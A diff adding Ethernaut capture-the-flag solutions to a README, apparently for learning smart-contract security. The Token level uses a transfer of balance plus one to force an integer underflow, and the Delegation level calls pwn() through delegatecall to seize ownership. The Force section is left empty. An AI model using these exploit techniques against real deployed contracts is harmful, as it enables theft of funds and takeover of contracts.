@@ -28,3 +28,23 @@ Afterwards, just call the `callFlipWithCorrectGuess()` function 10 times.
 
 Compile [TelephoneProxy.sol](./solutions/TelephoneProxy.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
 Afterwards, just call the `giveMeTelephoneOwnership(address _telephoneContract)` function with the level `instance` address as first argument.
+
+## 5. Token
+
+```
+const balance = Number(await contract.balanceOf(player));
+await contract.transfer(level /* can be any address except own */, balance + 1 /* create underflow in contract */);
+```
+
+## 6. Delegation
+
+See [Delegatecall](https://solidity-by-example.org/delegatecall/).
+```
+await contract.sendTransaction({ data: web3.eth.abi.encodeFunctionSignature("pwn()") });
+```
+
+## 7. Force
+
+```
+
+```
